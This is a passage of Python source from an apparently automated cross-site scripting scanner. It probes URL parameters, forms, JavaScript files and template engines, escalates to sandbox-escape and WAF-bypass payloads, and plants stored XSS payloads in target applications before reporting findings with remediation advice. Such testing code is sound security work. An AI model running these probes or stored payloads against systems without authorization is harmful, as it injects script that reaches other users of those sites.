            logger.debug(f"[XSS] Recon failed: {e}")
        
        return result
    
    async def _test_endpoint_xss(
        self,
        endpoint: str,
        rate_limiter: "RateLimiter",
    ) -> list[dict]:
        """Test endpoint for XSS with advanced techniques."""
        findings = []
        
        parsed = urlparse(endpoint)
        if not parsed.query:
            return findings
        
        params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        host = parsed.netloc
        
        for param_name in params:
            # Generate unique canary
            canary = self._generate_canary()
            
            # Test reflection
            test_params = params.copy()
            test_params[param_name] = [canary]
            
            try:
                async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
                    await rate_limiter.acquire(host)
                    response = await client.get(
                        base_url,
                        params={k: v[0] for k, v in test_params.items()}
                    )
                    
                    if canary not in response.text:
                        continue  # Not reflected
                    
                    # Detect context
                    context = self._detect_context(response.text, canary)
                    logger.debug(f"[XSS] Reflection in {context.name} for param {param_name}")
                    
                    # Get payloads for context
                    payloads = self._get_payloads_for_context(context)
                    
                    # Add WAF bypass payloads if WAF detected
                    if self._detected_waf != WAFType.NONE:
                        waf_payloads = self.WAF_BYPASS_PAYLOADS.get(self._detected_waf, [])
                        payloads = waf_payloads + payloads
                    
                    # Add polyglot payloads
                    payloads = self.POLYGLOT_PAYLOADS + payloads
                    
                    # Test payloads with cross-validation
                    for payload in payloads[:20]:  # Limit for efficiency
                        result = await self._test_payload_with_validation(
                            client, base_url, param_name, payload,
                            params, context, rate_limiter, host
                        )
                        
                        if result and result.confidence >= MIN_CONFIDENCE_THRESHOLD:
                            finding = self._create_finding(
                                result, base_url, param_name, "URL Parameter"
                            )
                            findings.append(finding.to_dict())
                            break  # Found confirmed XSS
                            
            except Exception as e:
                logger.debug(f"[XSS] Test failed for {param_name}: {e}")
        
        return findings
    
    async def _test_payload_with_validation(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        param_name: str,
        payload: str,
        original_params: dict,
        context: XSSContext,
        rate_limiter: "RateLimiter",
        host: str,
    ) -> XSSResult | None:
        """Test payload with cross-validation for confidence scoring."""
        confirmations = 0
        evidence_list = []
        
        # Generate mutations
        mutations = self.mutator.mutate(payload, mutation_level=2)[:5]
        
        for mutation in mutations:
            await rate_limiter.acquire(host)
            
            test_params = original_params.copy()
            test_params[param_name] = [mutation]
            
            try:
                response = await client.get(
                    base_url,
                    params={k: v[0] for k, v in test_params.items()}
                )
                
                # Check if blocked
                if self.waf_detector.is_blocked(response):
                    continue
                
                # Check reflection
                if self._check_xss_reflection(response.text, mutation):
                    confirmations += 1
                    
                    # Find reflection location
                    snippet = self._extract_reflection_snippet(response.text, mutation)
                    
                    evidence_list.append(XSSEvidence(
                        payload=mutation,
                        context=context,
                        reflected_in="response_body",
                        encoding_used="none" if mutation == payload else "mutated",
                        waf_bypassed=self._detected_waf != WAFType.NONE,
                        response_snippet=snippet,
                        confirmation_count=confirmations,
                    ))
                    
            except Exception:
                continue
        
        if confirmations >= CROSS_VALIDATION_REQUIRED:
            confidence = self._calculate_confidence(
                confirmations=confirmations,
                context=context,
                waf_detected=self._detected_waf != WAFType.NONE,
                csp_present=self._csp_info.get("present", False),
            )
            
            return XSSResult(
                vulnerable=True,
                context=context,
                confidence=confidence,
                payload=payload,
                evidence=evidence_list,
                waf_detected=self._detected_waf,
                csp_present=self._csp_info.get("present", False),
            )
        
        return None
    
    async def _test_form_xss(
        self,
        host: str,
        form: dict,
        rate_limiter: "RateLimiter",
    ) -> list[dict]:
        """Test form for XSS vulnerabilities."""
        findings = []
        
        action = form.get("action", "/")
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])
        
        if not action.startswith("http"):
            base = self._base_url or self._resolve_base_url(host)
            action = f"{base}{action}" if action.startswith("/") else f"{base}/{action}"
        
        for input_field in inputs:
            field_name = input_field.get("name")
            field_type = input_field.get("type", "text")
            
            if not field_name or field_type in ["hidden", "submit", "button", "file"]:
                continue
            
            # Build base form data
            form_data = {
                inp.get("name", ""): inp.get("value", "test")
                for inp in inputs if inp.get("name")
            }
            
            # Test with polyglot payloads first
            for payload in self.POLYGLOT_PAYLOADS[:5]:
                test_data = form_data.copy()
                test_data[field_name] = payload
                
                try:
                    async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
                        await rate_limiter.acquire(host)
                        
                        if method == "POST":
                            response = await client.post(action, data=test_data)
                        else:
                            response = await client.get(action, params=test_data)
                        
                        if self.waf_detector.is_blocked(response):
                            continue
                        
                        if self._check_xss_reflection(response.text, payload):
                            context = self._detect_context(response.text, payload)
                            confidence = self._calculate_confidence(
                                confirmations=1,
                                context=context,
                                waf_detected=self._detected_waf != WAFType.NONE,
                                csp_present=self._csp_info.get("present", False),
                            )
                            
                            if confidence >= MIN_CONFIDENCE_THRESHOLD:
                                findings.append(Finding(
                                    type="xss",
                                    name=f"Reflected XSS in Form ({context.name})",
                                    severity="HIGH",
                                    description=(
                                        f"Cross-Site Scripting vulnerability in form field '{field_name}'. "
                                        f"User input is reflected in {context.name} context without proper sanitization. "
                                        f"Confidence: {confidence}%"
                                    ),
                                    host=host,
                                    matched_at=action,
                                    evidence=[
                                        f"Form Action: {action}",
                                        f"Method: {method}",
                                        f"Field: {field_name}",
                                        f"Context: {context.name}",
                                        f"Payload: {payload}",
                                        f"WAF Bypassed: {self._detected_waf != WAFType.NONE}",
                                    ],
                                    cvss_score=6.1,
                                    cwe="CWE-79",
                                    confidence=confidence,
                                    remediation=(
                                        "1. Implement context-aware output encoding\n"
                                        "2. Use Content-Security-Policy headers\n"
                                        "3. Sanitize all user input before reflection\n"
                                        "4. Use HTTPOnly cookies to prevent cookie theft"
                                    ),
                                    references=[
                                        "https://owasp.org/www-community/attacks/xss/",
                                        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                                    ],
                                ).to_dict())
                                break
                                
                except Exception as e:
                    logger.debug(f"[XSS] Form test failed: {e}")
        
        return findings
    
    async def _analyze_dom_xss(
        self,
        host: str,
        js_url: str,
    ) -> list[dict]:
        """Analyze JavaScript for DOM XSS vulnerabilities."""
        findings = []
        
        try:
            async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
                response = await client.get(js_url)
                js_code = response.text
                
                # Find sources and sinks
                sources_found = []
                sinks_found = []
                
                for source in self.DOM_SOURCES:
                    if source in js_code:
                        sources_found.append(source)
                
                for sink in self.DOM_SINKS:
                    if sink in js_code:
                        sinks_found.append(sink)
                
                # Check for dangerous patterns
                dangerous_patterns = [
                    (r'innerHTML\s*=\s*.*location', "Direct innerHTML from location"),
                    (r'document\.write\s*\(.*location', "document.write with location"),
                    (r'eval\s*\(.*location', "eval with location data"),
                    (r'\.html\s*\(.*location', "jQuery .html() with location"),
                    (r'innerHTML\s*=.*\+.*\.value', "innerHTML with user input"),
                    (r'outerHTML\s*=', "outerHTML assignment"),
                    (r'insertAdjacentHTML\s*\(', "insertAdjacentHTML usage"),
                ]
                
                for pattern, description in dangerous_patterns:
                    matches = re.findall(pattern, js_code, re.IGNORECASE)
                    if matches:
                        # Calculate confidence based on context
                        confidence = 60
                        if sources_found and sinks_found:
                            confidence = 85
                        
                        findings.append(Finding(
                            type="dom_xss",
                            name=f"Potential DOM XSS: {description}",
                            severity="MEDIUM",
                            description=(
                                f"Potential DOM-based XSS vulnerability detected in JavaScript. "
                                f"Pattern: {description}. "
                                f"Sources found: {', '.join(sources_found[:5]) or 'None'}. "
                                f"Sinks found: {', '.join(sinks_found[:5]) or 'None'}."
                            ),
                            host=host,
                            matched_at=js_url,
                            evidence=[
                                f"Pattern: {pattern}",
                                f"Sources: {sources_found[:5]}",
                                f"Sinks: {sinks_found[:5]}",
                            ],
                            cvss_score=5.4,
                            cwe="CWE-79",
                            confidence=confidence,
                            remediation=(
                                "1. Avoid using innerHTML with user-controlled data\n"
                                "2. Use textContent instead of innerHTML when possible\n"
                                "3. Sanitize data before using in DOM manipulation\n"
                                "4. Use DOMPurify library for sanitization"
                            ),
                        ).to_dict())
                        
        except Exception as e:
            logger.debug(f"[XSS] DOM analysis failed: {e}")
        
        return findings
    
    async def _test_common_vectors(
        self,
        host: str,
        rate_limiter: "RateLimiter",
    ) -> list[dict]:
        """Test common XSS injection points."""
        findings = []
        
        # Common vulnerable parameters
        common_params = [
            "q", "query", "search", "s", "keyword", "keywords",
            "name", "user", "username", "email", "message", "msg",
            "text", "content", "comment", "body", "title",
            "url", "redirect", "return", "next", "callback",
            "id", "page", "file", "path", "lang", "language",
            "error", "err", "debug",
            # Juice Shop specific parameters
            "feedback", "rating", "captcha", "captchaId", "UserId",
            "comment", "author", "message", "file",
        ]
        
        # Test parameters with polyglot
        base = self._base_url or self._resolve_base_url(host)
        for param in common_params:
            await rate_limiter.acquire(host)

            try:
                async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
                    for payload in self.POLYGLOT_PAYLOADS[:3]:
                        response = await client.get(
                            f"{base}/",
                            params={param: payload}
                        )

                        if self.waf_detector.is_blocked(response):
                            continue

                        if self._check_xss_reflection(response.text, payload):
                            context = self._detect_context(response.text, payload)

                            # Cross-validate
                            await rate_limiter.acquire(host)
                            response2 = await client.get(
                                f"{base}/",
                                params={param: payload}
                            )

                            if self._check_xss_reflection(response2.text, payload):
                                confidence = self._calculate_confidence(
                                    confirmations=2,
                                    context=context,
                                    waf_detected=self._detected_waf != WAFType.NONE,
                                    csp_present=self._csp_info.get("present", False),
                                )

                                if confidence >= MIN_CONFIDENCE_THRESHOLD:
                                    findings.append(Finding(
                                        type="xss",
                                        name=f"Reflected XSS via Common Parameter ({context.name})",
                                        severity="HIGH",
                                        description=(
                                            f"XSS vulnerability found in common parameter '{param}'. "
                                            f"Confidence: {confidence}%"
                                        ),
                                        host=host,
                                        matched_at=f"{base}/?{param}=",
                                        evidence=[
                                            f"Parameter: {param}",
                                            f"Context: {context.name}",
                                            f"Payload: {payload}",
                                        ],
                                        cvss_score=6.1,
                                        cwe="CWE-79",
                                        confidence=confidence,
                                        remediation="Implement proper input validation and output encoding.",
                                    ).to_dict())
                                    break

            except Exception as e:
                logger.debug(f"[XSS] Common vector test failed for {param}: {e}")
        
        return findings
    
    # ==========================================================================
    # TEMPLATE INJECTION (Angular/Vue/React/Handlebars/EJS)
    # ==========================================================================

    async def _test_template_injection(
        self,
        host: str,
        endpoints: list[str],
        rate_limiter: "RateLimiter",
    ) -> list[dict]:
        """Test for client-side template injection in Angular/Vue/React apps."""
        findings: list[dict] = []
        base_url = self._base_url

        # Common parameters to test template expressions in
        test_params = ["q", "search", "query", "name", "title", "message", "text", "value", "input", "data"]

        # Build test URLs from endpoints
        test_urls = []
        for ep in endpoints[:5]:
            parsed = urlparse(ep)
            if parsed.query:
                test_urls.append(ep)
            else:
                for p in test_params[:5]:
                    test_urls.append(f"{ep}?{p}=TEMPLATE_TEST")

        if not test_urls:
            test_urls = [f"{base_url}/?q=TEMPLATE_TEST"]

        headers = dict(self._auth_headers) if hasattr(self, "_auth_headers") else {}

        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for url_template in test_urls[:10]:
                for payload, payload_name in self.TEMPLATE_INJECTION_PAYLOADS:
                    # Only test math expressions first (fast detection)
                    if not payload_name.endswith("_expression"):
                        continue

                    await rate_limiter.acquire(host)

                    # Replace the parameter value with the template payload
                    parsed = urlparse(url_template)
                    params = parse_qs(parsed.query)
                    if not params:
                        continue

                    param_name = list(params.keys())[0]
                    test_params_dict = {k: v[0] for k, v in params.items()}
                    test_params_dict[param_name] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_dict)}"

                    try:
                        resp = await client.get(test_url, headers=headers)

                        # Check if math result appears (template was evaluated)
                        if self.TEMPLATE_MATH_RESULT in resp.text and payload not in resp.text:
                            # Template expression was evaluated! Now test exploitation payloads
                            logger.info(f"[XSS] Template injection detected at {param_name} ({payload_name})")

                            # Determine framework
                            framework = "Unknown"
                            if "angular" in payload_name:
                                framework = "Angular"
                            elif "vue" in payload_name:
                                framework = "Vue.js"
                            elif "ejs" in payload_name:
                                framework = "EJS"
                            elif "pug" in payload_name:
                                framework = "Pug/Jade"

                            findings.append(Finding(
                                type="xss",
                                name=f"Client-Side Template Injection ({framework})",
                                severity="HIGH",
                                description=(
                                    f"Client-side template injection detected in {framework} application. "
                                    f"The expression {payload} was evaluated by the template engine, "
                                    f"returning '{self.TEMPLATE_MATH_RESULT}'. This can be escalated to XSS "
                                    f"via constructor-based sandbox escapes."
                                ),
                                host=parsed.netloc,
                                matched_at=f"{parsed.path} ({param_name})",
                                evidence=[
                                    f"Framework: {framework}",
                                    f"Parameter: {param_name}",
                                    f"Payload: {payload}",
                                    f"Expected: {self.TEMPLATE_MATH_RESULT}",
                                    f"Result: Template expression evaluated successfully",
                                ],
                                cvss_score=7.1,
                                cwe="CWE-79",
                                confidence=90,
                                metadata={
                                    "template_injection": True,
                                    "framework": framework,
                                    "payload": payload,
                                    "parameter": param_name,
                                },
                            ).to_dict())

                            # Now try actual XSS exploitation payloads for this framework
                            for exploit_payload, exploit_name in self.TEMPLATE_INJECTION_PAYLOADS:
                                if exploit_name.endswith("_expression"):
                                    continue  # Already tested
                                if framework.lower() not in exploit_name:
                                    continue  # Wrong framework

                                await rate_limiter.acquire(host)
                                test_params_dict[param_name] = exploit_payload
                                exploit_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_dict)}"

                                try:
                                    exploit_resp = await client.get(exploit_url, headers=headers)
                                    # If no error and payload not reflected literally, likely executed
                                    if exploit_resp.status_code == 200 and exploit_payload not in exploit_resp.text:
                                        findings.append(Finding(
                                            type="xss",
                                            name=f"Template Injection XSS ({framework} Sandbox Escape)",
                                            severity="CRITICAL",
                                            description=(
                                                f"XSS via {framework} template injection sandbox escape. "
                                                f"Arbitrary JavaScript execution confirmed."
                                            ),
                                            host=parsed.netloc,
                                            matched_at=f"{parsed.path} ({param_name})",
                                            evidence=[
                                                f"Framework: {framework}",
                                                f"Exploit payload: {exploit_payload[:100]}...",
                                                f"Sandbox escape technique: {exploit_name}",
                                            ],
                                            cvss_score=9.0,
                                            cwe="CWE-79",
                                            confidence=85,
                                            metadata={
                                                "template_injection": True,
                                                "sandbox_escape": True,
                                                "framework": framework,
                                            },
                                        ).to_dict())
                                        break  # One exploit is enough
                                except Exception:
                                    continue

                            break  # Found template injection for this URL, move on

                    except Exception as e:
                        logger.debug(f"[XSS] Template injection test error: {e}")

        return findings

    # ==========================================================================
    # STORED XSS - ENTERPRISE-GRADE PERSISTENCE VERIFICATION
    # ==========================================================================

    async def _test_stored_xss_with_persistence(
        self,
        host: str,
        rate_limiter: "RateLimiter",
        asset_data: dict[str, Any],
    ) -> list[dict]:
        """
        Test for Stored XSS with REAL persistence verification.
        
        This separates professional scanners from basic ones:
        1. Submit payload to storage endpoint (POST)
        2. Wait for persistence
        3. Retrieve data in NEW session (GET)
        4. Verify payload executes in fresh context
        5. Confirm it's truly STORED, not reflected
        
        Returns findings with CRITICAL severity for confirmed stored XSS.
        """
        findings = []
        stored_xss_tested = 0
        stored_xss_confirmed = 0
        
        # Detect application type for targeted testing
        app_type = self._detect_application_type(host, asset_data)
        logger.info(f"[XSS-STORED] Detected application type: {app_type}")
        
        # Get all relevant endpoint configurations
        endpoints_to_test = []
        
        # Add generic endpoints
        endpoints_to_test.extend(self.STORED_XSS_ENDPOINTS.get("generic", []))
        
        # Add app-specific endpoints
        if app_type:
            endpoints_to_test.extend(self.STORED_XSS_ENDPOINTS.get(app_type, []))
        
        # Add endpoints from asset_data (discovered during crawl)
        forms = asset_data.get("forms", [])
        for form in forms:
            if form.get("method", "").upper() == "POST":
                action = form.get("action", "")
                inputs = form.get("inputs", [])
                
                # Build data template from form inputs
                data_template = {}
                for inp in inputs:
                    name = inp.get("name", "")
                    if name and inp.get("type") not in ["hidden", "submit", "button"]:
                        data_template[name] = "{payload}"
                    elif name:
                        data_template[name] = inp.get("value", "")
                
                if data_template and any("{payload}" in str(v) for v in data_template.values()):
                    endpoints_to_test.append((action, "POST", data_template, action))
        
        # Generate unique test ID for this scan
        scan_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True) as client:
            for endpoint_config in endpoints_to_test:
                submit_path, method, data_template, retrieve_path = endpoint_config
                
                # Skip if path has placeholder that we can't resolve
                if "{id}" in submit_path and "{id}" not in str(asset_data):
                    # Try common IDs
                    for test_id in ["1", "2", "3"]:
                        resolved_submit = submit_path.replace("{id}", test_id)
                        resolved_retrieve = retrieve_path.replace("{id}", test_id)
                        result = await self._test_single_stored_endpoint(
                            client, host, resolved_submit, method, data_template,
                            resolved_retrieve, scan_id, rate_limiter
                        )
                        if result:
                            findings.append(result)
                            stored_xss_confirmed += 1
                            break
                else:
                    result = await self._test_single_stored_endpoint(
                        client, host, submit_path, method, data_template,
                        retrieve_path, scan_id, rate_limiter
                    )
                    if result:
                        findings.append(result)
                        stored_xss_confirmed += 1
                
                stored_xss_tested += 1
        
        logger.info(
            f"[XSS-STORED] Tested {stored_xss_tested} persistence endpoints, "
            f"confirmed {stored_xss_confirmed} STORED XSS vulnerabilities"
        )
        
        return findings
    
    async def _test_single_stored_endpoint(
        self,
        client: httpx.AsyncClient,
        host: str,
        submit_path: str,
        method: str,
        data_template: dict,
        retrieve_path: str,
        scan_id: str,
        rate_limiter: "RateLimiter",
    ) -> dict | None:
        """
        Test a single endpoint pair for stored XSS.
        
        Returns Finding dict if stored XSS is confirmed, None otherwise.
        """
        # Construct full URLs - smart protocol detection
        if host.startswith("http"):
            base_url = host
        else:
            # Detect protocol based on port
            port = "443"
            if ":" in host:
                port = host.split(":")[-1]
            
            # Use HTTP for common non-HTTPS ports
            if port in ["80", "8080", "8000", "3000", "5000", "8888"]:
                base_url = f"http://{host}"
            else:
                base_url = f"https://{host}"
        
        # Handle relative/absolute paths
        if submit_path.startswith("http"):
            submit_url = submit_path
        elif submit_path.startswith("/"):
            submit_url = f"{base_url}{submit_path}"
        else:
            submit_url = f"{base_url}/{submit_path}"
        
        if retrieve_path.startswith("http"):
            retrieve_url = retrieve_path
        elif retrieve_path.startswith("/"):
            retrieve_url = f"{base_url}{retrieve_path}"
        else:
            retrieve_url = f"{base_url}/{retrieve_path}"
        
        # Test each stored XSS payload
        for payload_template in self.STORED_XSS_PAYLOADS[:5]:
            # Generate unique payload ID for verification
            payload_id = f"{scan_id}_{hashlib.md5(submit_url.encode()).hexdigest()[:6]}"
            payload = payload_template.replace("{id}", payload_id)
            
            # Build submission data
            submit_data = {}
            for key, value in data_template.items():
                if "{payload}" in str(value):
                    submit_data[key] = str(value).replace("{payload}", payload)
                else:
                    submit_data[key] = value
            
            try:
                # Step 1: Submit payload
                await rate_limiter.acquire(host)
                
                if method.upper() in ["POST", "PUT", "PATCH"]:
                    # Try JSON first, then form data
                    headers = {"Content-Type": "application/json"}
                    try:
                        submit_response = await client.request(
                            method.upper(),
                            submit_url,
                            json=submit_data,
                            headers=headers
                        )
                    except Exception:
                        # Fallback to form data
                        submit_response = await client.request(
                            method.upper(),
                            submit_url,
                            data=submit_data
                        )
                else:
                    submit_response = await client.request(
                        method.upper(),
                        submit_url,
                        params=submit_data
                    )
                
                # Check if submission was accepted (2xx or 3xx)
                if submit_response.status_code >= 400:
                    logger.debug(f"[XSS-STORED] Submission rejected: {submit_response.status_code}")
                    continue
                
                logger.debug(f"[XSS-STORED] Payload submitted to {submit_url}")
                
                # Step 2: Wait briefly for persistence
                await asyncio.sleep(0.5)
                
                # Step 3: Retrieve in NEW request (simulates different session)
                await rate_limiter.acquire(host)
                
                # Use different headers to simulate new session
                retrieve_headers = {
                    "User-Agent": "Mozilla/5.0 (StoredXSS-Verification-Agent)",
                    "Cache-Control": "no-cache",
                }
                
                retrieve_response = await client.get(
                    retrieve_url,
                    headers=retrieve_headers
                )
                
                # Step 4: Verify payload persists AND executes
                response_text = retrieve_response.text
                
                # Check for unique payload ID in response
                if payload_id in response_text:
                    # Verify it's in executable context (not escaped)
                    is_executable = self._verify_stored_xss_executable(response_text, payload, payload_id)
                    
                    if is_executable:
                        logger.info(
                            f"[XSS-STORED] *** CONFIRMED STORED XSS ***\n"
                            f"    Submit: {submit_url}\n"
                            f"    Retrieve: {retrieve_url}\n"
                            f"    Payload: {payload}"
                        )
                        
                        # Create CRITICAL finding
                        return self._create_stored_xss_finding(
                            host=host,
                            submit_url=submit_url,
                            retrieve_url=retrieve_url,
                            payload=payload,
                            payload_id=payload_id,
                            response_snippet=self._extract_reflection_snippet(response_text, payload_id),
                            submit_data=submit_data,
                        )
                
            except Exception as e:
                logger.debug(f"[XSS-STORED] Test failed for {submit_url}: {e}")
                continue
        
        return None
    
    def _verify_stored_xss_executable(
        self,
        response_text: str,
        payload: str,
        payload_id: str,
    ) -> bool:
        """
        Verify that stored payload is in executable context.
        
        Checks:
        1. Payload is present (not just the ID)
        2. Script tags/event handlers are not HTML-encoded
        3. Payload is not inside HTML comment
        4. Payload is not inside <script> with different encoding
        """
        # Check if full payload (or key parts) are present unencoded
        executable_indicators = [
            f'<script>alert("STORED_XSS_{payload_id}")</script>',
            f'onerror=alert("STORED_XSS_{payload_id}")',
            f'onload=alert("STORED_XSS_{payload_id}")',
            f"alert('STORED_XSS_{payload_id}')",
            f'javascript:alert',
        ]
        
        for indicator in executable_indicators:
            if indicator in response_text:
                # Verify not inside comment
                pos = response_text.find(indicator)
                before = response_text[:pos]
                
                # Not in HTML comment
                if before.rfind('<!--') > before.rfind('-->'):
                    continue
                
                # Not HTML-escaped
                escaped = html.escape(indicator)
                if escaped in response_text and indicator not in response_text.replace(escaped, ''):
                    continue
                
                return True
        
        # Also check for partial payload execution (tag present)
        if f'STORED_XSS_{payload_id}' in response_text:
            # Check if surrounding context allows execution
            for tag in ['<script', '<img', '<svg', '<iframe', '<body', 'onerror=', 'onload=']:
                if tag in response_text.lower():
                    # Find if tag is near our payload
                    payload_pos = response_text.find(f'STORED_XSS_{payload_id}')
                    context = response_text[max(0, payload_pos-100):payload_pos+100]
                    if tag in context.lower():
                        return True
        
        return False
    
    def _create_stored_xss_finding(
        self,
        host: str,
        submit_url: str,
        retrieve_url: str,
        payload: str,
        payload_id: str,
        response_snippet: str,
        submit_data: dict,
    ) -> dict:
        """Create a CRITICAL stored XSS finding with full evidence."""
        # Generate exploitation PoC
        poc = ExploitationHelper.generate_xss_poc(
            url=submit_url,
            parameter=list(submit_data.keys())[0] if submit_data else "unknown",
            payload=payload,
            xss_type="stored",
            context="html_body",
        )
        
        evidence = [
            f"[PERSISTENCE VERIFIED] Payload stored and retrieved in separate request",
            f"Submit Endpoint: {submit_url}",
            f"Retrieve Endpoint: {retrieve_url}",
            f"Unique Payload ID: {payload_id}",
            f"Full Payload: {payload}",
            f"Submit Data: {submit_data}",
            f"Response Snippet: {response_snippet[:200]}...",
            "[IMPACT] Any user visiting the page will execute attacker's JavaScript",
            "[IMPACT] Session hijacking, credential theft, malware distribution possible",
        ]
        
        return Finding(
            type="stored_xss",
            name="STORED XSS - Persistence Confirmed",
            severity="CRITICAL",
            description=(
                f"**CRITICAL STORED XSS VULNERABILITY** confirmed with real persistence verification. "
                f"Malicious JavaScript payload was submitted to '{submit_url}' and confirmed to execute "
                f"when retrieved from '{retrieve_url}' in a separate session. "
                f"\n\n**Attack Chain:**\n"
                f"1. Attacker submits XSS payload via {submit_url}\n"
                f"2. Payload is stored in application database\n"
                f"3. ANY user visiting {retrieve_url} executes attacker's JavaScript\n"
                f"4. Attacker can steal sessions, credentials, perform actions as victim\n\n"
                f"**Verification Method:** Unique payload ID '{payload_id}' was:\n"
                f"- Submitted via POST request\n"
                f"- Retrieved in separate GET request (different session context)\n"
                f"- Confirmed executable (not HTML-encoded)"
            ),
            host=host,
            matched_at=submit_url,
            evidence=evidence,
            cvss_score=9.0,  # CRITICAL - affects all users
            cwe="CWE-79",
            confidence=98,  # Very high - persistence verified
            remediation=(
                "**IMMEDIATE ACTION REQUIRED:**\n\n"
                "1. **Output Encoding (CRITICAL):**\n"
                "   - HTML encode all user data before rendering: `&lt;` `&gt;` `&quot;` `&#x27;` `&#x2F;`\n"
                "   - Use context-aware encoding (HTML/JS/URL/CSS)\n"
                "   - Use auto-escaping template engines (Jinja2, React, Angular)\n\n"
                "2. **Input Validation:**\n"
                "   - Whitelist allowed characters\n"
                "   - Strip HTML tags where not needed\n"
                "   - Use DOMPurify for rich text\n\n"
                "3. **Content Security Policy:**\n"
                "   - Implement strict CSP: `default-src 'self'; script-src 'self'`\n"
                "   - Use nonces for inline scripts\n"
                "   - Block 'unsafe-inline' and 'unsafe-eval'\n\n"
                "4. **Additional Hardening:**\n"
                "   - Set HttpOnly and Secure flags on session cookies\n"
                "   - Implement SameSite cookie attribute\n"
                "   - Use X-XSS-Protection header\n"
                "   - Sanitize data on input AND output"
            ),
            references=[
                "https://owasp.org/www-community/attacks/xss/",
                "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
                "https://portswigger.net/web-security/cross-site-scripting/stored",
                "https://cwe.mitre.org/data/definitions/79.html",
                "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html",
            ],
            metadata={
                "poc": poc.to_dict() if poc else {},
                "stored_xss": True,
                "persistence_verified": True,
                "payload_id": payload_id,
                "submit_endpoint": submit_url,
                "retrieve_endpoint": retrieve_url,
                "attack_chain": "submit → store → retrieve → execute",
            },
        ).to_dict()
    
    def _detect_application_type(self, host: str, asset_data: dict) -> str | None:
        """Detect application type for targeted stored XSS testing."""
        # Check from asset_data
        tech = asset_data.get("technologies", {})
        
        # Check for known applications
        if "juice" in host.lower() or "juice-shop" in str(tech).lower():
            return "juice-shop"
        
        if "wordpress" in str(tech).lower() or "wp-" in str(asset_data).lower():
            return "wordpress"
        
        # Check endpoints for CMS patterns
        endpoints = asset_data.get("endpoints", [])
        for ep in endpoints:
            if "/wp-" in ep or "/wordpress" in ep:
                return "wordpress"
            if "/admin" in ep or "/cms" in ep:
                return "cms"
        
        return None
    
    def _generate_canary(self) -> str:
        """Generate unique canary for reflection detection."""
        random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"xss{random_part}canary"
    
    def _detect_context(self, html_content: str, canary: str) -> XSSContext:
        """Detect the context where input is reflected."""
        pos = html_content.find(canary)
        if pos == -1:
            return XSSContext.UNKNOWN
        
        # Get surrounding context
        start = max(0, pos - 100)
        end = min(len(html_content), pos + len(canary) + 100)
        context_str = html_content[start:end]
        
        # Check for various contexts
        before = html_content[start:pos]
        after = html_content[pos + len(canary):end]
        
        # JavaScript context
        if re.search(r'<script[^>]*>.*$', before, re.DOTALL | re.IGNORECASE):
            if "'" in before[-50:] and not '"' in before[-50:]:
                return XSSContext.JS_STRING_SINGLE
            elif '"' in before[-50:]:
                return XSSContext.JS_STRING
            elif '`' in before[-50:]:
                return XSSContext.JS_TEMPLATE
            return XSSContext.JS_BLOCK
        
        # Attribute context
        attr_double = re.search(r'=\s*"[^"]*$', before)
        attr_single = re.search(r"=\s*'[^']*$", before)
        attr_unquoted = re.search(r'=\s*[^\s"\'>]*$', before)
        
        if attr_double:
            return XSSContext.HTML_ATTRIBUTE
        if attr_single:
            return XSSContext.HTML_ATTRIBUTE_SINGLE
        if attr_unquoted and not attr_double and not attr_single:
            return XSSContext.HTML_ATTRIBUTE_UNQUOTED
        
        # URL context (href, src, action)
        if re.search(r'(?:href|src|action)\s*=\s*["\']?[^"\']*$', before, re.IGNORECASE):
            return XSSContext.URL_PARAM
        
        # CSS context
        if re.search(r'style\s*=\s*["\'][^"\']*$', before, re.IGNORECASE):
            return XSSContext.CSS_VALUE
        
        # SVG context
        if re.search(r'<svg[^>]*>.*$', before, re.DOTALL | re.IGNORECASE):
            return XSSContext.SVG_CONTEXT
        
        # Comment context
        if '<!--' in before and '-->' not in before:
            return XSSContext.COMMENT
        
        # Default to HTML text
        return XSSContext.HTML_TEXT
    
    def _get_payloads_for_context(self, context: XSSContext) -> list[str]:
        """Get appropriate payloads for detected context."""
        return self.PAYLOADS_BY_CONTEXT.get(context, self.PAYLOADS_BY_CONTEXT[XSSContext.HTML_TEXT])
    
    def _check_xss_reflection(self, html_content: str, payload: str) -> bool:
        """Check if XSS payload is reflected and executable."""
        # Direct reflection
        if payload in html_content:
            return self._is_payload_executable(html_content, payload)
        
        # Check URL decoded version
        decoded = unquote(payload)
        if decoded in html_content:
            return self._is_payload_executable(html_content, decoded)
        
        # Check HTML entity decoded
        html_decoded = html.unescape(payload)
        if html_decoded in html_content:
            return self._is_payload_executable(html_content, html_decoded)
        
        return False
    
    def _is_payload_executable(self, html_content: str, payload: str) -> bool:
        """
        Verify payload is in executable position (not just reflected as text).
        Anti-false-positive heuristic.
        """
        pos = html_content.find(payload)
        if pos == -1:
            return False
        
        # Check if inside HTML comment
        before = html_content[:pos]
        if before.rfind('<!--') > before.rfind('-->'):
            return False
        
        # Check if HTML encoded by the app
        encoded_check = html.escape(payload)
        if encoded_check in html_content and payload not in html_content.replace(encoded_check, ''):
            return False
        
        # Check for script context
        script_tags = ['<script', 'onerror=', 'onload=', 'onclick=', 'onmouseover=',
                       'onfocus=', 'onblur=', 'javascript:', 'data:text/html']
        
        # At least one script indicator should be unencoded
        for tag in script_tags:
            if tag.lower() in payload.lower() and tag.lower() in html_content.lower():
                return True
        
        return False
    
    def _extract_reflection_snippet(self, html_content: str, payload: str) -> str:
        """Extract snippet around reflected payload."""
        pos = html_content.find(payload)
        if pos == -1:
            pos = html_content.find(unquote(payload))
        if pos == -1:
            return ""
        
